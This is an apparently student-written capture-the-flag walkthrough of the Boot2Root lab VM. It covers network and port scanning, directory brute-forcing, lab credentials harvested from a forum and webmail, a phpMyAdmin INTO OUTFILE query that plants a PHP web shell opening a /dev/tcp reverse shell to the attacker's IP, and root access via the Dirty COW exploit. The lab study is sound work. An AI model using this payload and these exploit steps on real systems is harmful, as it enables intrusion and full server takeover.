The **Boot2Root** project is an entry-level challenge in **computer security** that allows participants to explore **ethical hacking** and **server exploitation** techniques. The goal is to gain **root access** (administrator privileges) on a server by discovering and exploiting vulnerabilities. The project is hands-on and emphasizes learning through practice, using a variety of tools and methods to solve real-world security challenges.

## Retrieve IP Address

The first step was to retrieve the IP address of the box. Initially, I tried using `VBoxManage` to get the IP address, but it didn’t work. I almost gave up at this step—just kidding, of course! 😄

Instead, I decided to scan the network using the following script:

```bash
for ip in $(seq 1 254); do ping -c 1 10.13.100.$ip | grep "64 bytes" & done > ip00
```

The first scan was done with no box running. After starting the box, I ran the script again and compared the outputs. In the second output, I noticed a new IP address, which turned out to be the IP of the box. Finally, I successfully retrieved the IP address of the box.

```bash
for ip in $(seq 1 254); do ping -c 1 10.13.100.$ip | grep "64 bytes" & done > ip01
```

After retrieving the IP address, I needed to find the open ports on this box. I didn't have the `nmap` tool to scan the ports—haha, I’m just a beginner! 😄 So, I tried using a script to scan all the open ports and save them to a file:

```bash
for port in $(seq 1 9999); do
  echo "Scanning 10.13.100.236 on port $port..."
  nc -zv 10.13.100.236 $port 2>&1 | grep succeeded
done > port
```

```bash
for port in $(seq 1 9999); do
  echo "Scanning 10.13.100.236 on port $port..."
  nc -zv 10.13.100.236 $port 2>&1 | grep succeeded
done > port
```

Simple bash loop that scans ports on the host `10.13.100.236` from 1 to 9999 using `netcat` (`nc`)

The Output:

```bash
Connection to 10.13.100.236 port 21 [tcp/ftp] succeeded!
Connection to 10.13.100.236 port 22 [tcp/ssh] succeeded!
Connection to 10.13.100.236 port 80 [tcp/http] succeeded!
Connection to 10.13.100.236 port 143 [tcp/imap] succeeded!
Connection to 10.13.100.236 port 443 [tcp/https] succeeded!
Connection to 10.13.100.236 port 993 [tcp/imaps] succeeded!
```

The second option is to use the `nmap` tool to scan the ports:

```bash
root@debian:/home/yoyo# nmap 10.13.100.236
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps
```

To scan directories on a server using an IP address, I use `Dirb`, a command-line tool that utilizes a wordlist to discover directories and files on a web server:

```bash

dirb https://10.13.100.236/
```

You can also use `Gobuster`, a tool for brute-forcing URIs (directories and files) on web servers. It’s fast and also relies on a wordlist:

```bash
gobuster dir -u https://10.13.100.236 -w rockyou.txt -k

```

---

The Output:

```bash
root@debian:/home/yoyo# dirb https://10.13.100.236/
[...]
---- Scanning URL: https://10.13.100.236/ ----
+ https://10.13.100.236/cgi-bin/ (CODE:403|SIZE:290)
==> DIRECTORY: https://10.13.100.236/forum/
==> DIRECTORY: https://10.13.100.236/phpmyadmin/
+ https://10.13.100.236/server-status (CODE:403|SIZE:295)
==> DIRECTORY: https://10.13.100.236/webmail/
[...]
```

In this URL, https://10.13.100.236/forum/, I found a forum page titled "HackMe," which displays a few discussion threads, with only four registered users. The topics include "Welcome to this new Forum!", "Probleme login?", "Gasolina," and "Les mouettes!

![Screen Shot 2024-10-19 at 11.48.13 PM.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/6f2fde31-9543-4e4c-9330-82632d6d36e1/894814eb-9113-4ac2-b1b7-e0bd897b5eb8/Screen_Shot_2024-10-19_at_11.48.13_PM.png)

I tried to navigate to "Probleme login" and found a password: https://10.13.100.236/forum/index.php?id=6

```
Oct 5 08:45:27 BornToSecHackMe sshd[7547]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=161.202.39.38-static.reverse.softlayer.com
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3:
```

Then, I logged in with the username `lmezard` and the password `!q\]Ej?*5K5cy*AJ`.

![Screen Shot 2024-10-20 at 12.00.32 AM.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/6f2fde31-9543-4e4c-9330-82632d6d36e1/90d9c76c-47bd-4154-a5cd-0140efdc6fe4/Screen_Shot_2024-10-20_at_12.00.32_AM.png)

I found the email address `laurie@borntosec.net` in this form.

---

![Screen Shot 2024-10-20 at 12.03.36 AM.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/6f2fde31-9543-4e4c-9330-82632d6d36e1/db3ccddf-950b-48ff-80c2-4b71568281b5/Screen_Shot_2024-10-20_at_12.03.36_AM.png)

Now I have the email address `laurie@borntosec.net` and the password `!q\]Ej?*5K5cy*AJ`. Let's try to log in to the email box. https://10.13.100.236/webmail/

![Screen Shot 2024-10-20 at 12.08.53 AM.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/6f2fde31-9543-4e4c-9330-82632d6d36e1/9b3f1156-00f1-48dc-a756-775526a63be4/Screen_Shot_2024-10-20_at_12.08.53_AM.png)

I found an email message that contains the username and password for the database:

```
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```

---

Then, I logged into the database with the username `root` and the password `Fg-'kKXBj87E:aJ$`.

https://10.13.100.236/phpmyadmin/

![Screen Shot 2024-10-20 at 12.15.26 AM.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/6f2fde31-9543-4e4c-9330-82632d6d36e1/a1a8b105-d752-48fd-a2c2-c1d3e4bcb450/Screen_Shot_2024-10-20_at_12.15.26_AM.png)

## SQL injection

After logging into the database, I ran an SQL query (SQL injection) to create a reverse shell to  execute commands on the box:

```sql
SELECT '<?php system("bash -c \'exec bash -i &>/dev/tcp/10.13.100.96/4444 <&1\'"); ?>' INTO OUTFILE '/var/www/forum/templates_c/reverse_shell.php.php';
```

![Screen Shot 2024-10-20 at 12.33.33 AM.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/6f2fde31-9543-4e4c-9330-82632d6d36e1/a52784d6-2b04-415e-9f16-a3b3558ed586/Screen_Shot_2024-10-20_at_12.33.33_AM.png)

The SQL statement used in a SQL injection attack to create a web shell on a vulnerable server.

- **`SELECT` Statement**:
    - This part is selecting a PHP command that will create a reverse shell.
- **`'<?php system("bash -c \'exec bash -i &>/dev/tcp/10.13.100.96/4444 <&1\'"); ?>'`**:
    - This string is a PHP script that, when executed, will open a reverse shell connection back to the attacker's machine at IP `10.13.100.96` on port `4444`.
    - The `system` function in PHP is used to execute the command passed to it.
- **`INTO OUTFILE '/var/www/forum/templates_c/`**reverse_shell.php**`';`**:
    - This part writes the selected PHP script to a file named reverse_shell.php located in the specified directory on the server. This file would then be accessible via a web server, allowing the attacker to execute the PHP code

After that, I set up a listener on my local machine or VM using Netcat:

```
nc -lvnp 4444
```

**`nc`**: This is the Netcat command

**`-l`**: This option tells Netcat to listen for incoming connection

**`-v`**: This stands for "verbose." It provides more detailed output

**`-n`**: This option prevents DNS lookups.

**`-p 4444`**: This specifies the port number (`4444`) on which the listener will wait for incoming connections.

I made an HTTP request to a web server, specifically targeting a PHP file that may contain malicious code:

```bash
curl -k https://10.13.100.236/forum/templates_c/reverse_shell.php
```

Then, I can execute command-line instructions as the user `www-data`. For example:

```bash
www-data@BornToSecHackMe:/var/www/forum/templates_c$ whoami
whoami
www-data
www-data@BornToSecHackMe:/var/www/forum/templates_c$
```

## Privilege escalation

After checking the kernel release date, I found it to be **Wed Sep 9 11:27:47 UTC 2015**. I did some research and discovered that vulnerabilities like **Dirty COW** were present in the operating system around that time.

```jsx
www-data@BornToSecHackMe:/var/www/forum/templates_c$ uname -a
uname -a
Linux BornToSecHackMe 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015 i686 i686 i386 GNU/Linux
www-data@BornToSecHackMe:/var/www/forum/templates_c
```

**Dirty COW** (CVE-2016-5195) is a well-known privilege escalation vulnerability in the Linux kernel, discovered in October 2016. It stands for **"Copy-On-Write"** and affects how the Linux kernel handles this memory management feature.

Here’s a brief explanation:

### What is Dirty COW?

- **Copy-On-Write (COW)** is a mechanism that allows processes to share memory pages until a write operation occurs. Once a process attempts to modify a shared page, a new copy of the page is created for that process.
- The **Dirty COW vulnerability** occurs because the kernel improperly handles this mechanism, allowing unprivileged users to write to read-only memory, thus "dirtying" the memory.

### Exploit:

- An attacker can exploit Dirty COW to gain **root privileges** by modifying files they normally wouldn't have access to, such as system binaries.

Compile the `dirty.c` file:

```jsx
gcc -pthread dirty.c -o dirty -lcrypt
```

Run the compiled exploit:

```jsx
./dirty
```

Spawn a TTY shell because the shell environment is not stable:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Switch to the root user using the `su` command:

```jsx
www-data@BornToSecHackMe:/var/www/forum/templates_c$ su root
Password: yoyo
root@BornToSecHackMe:~#
```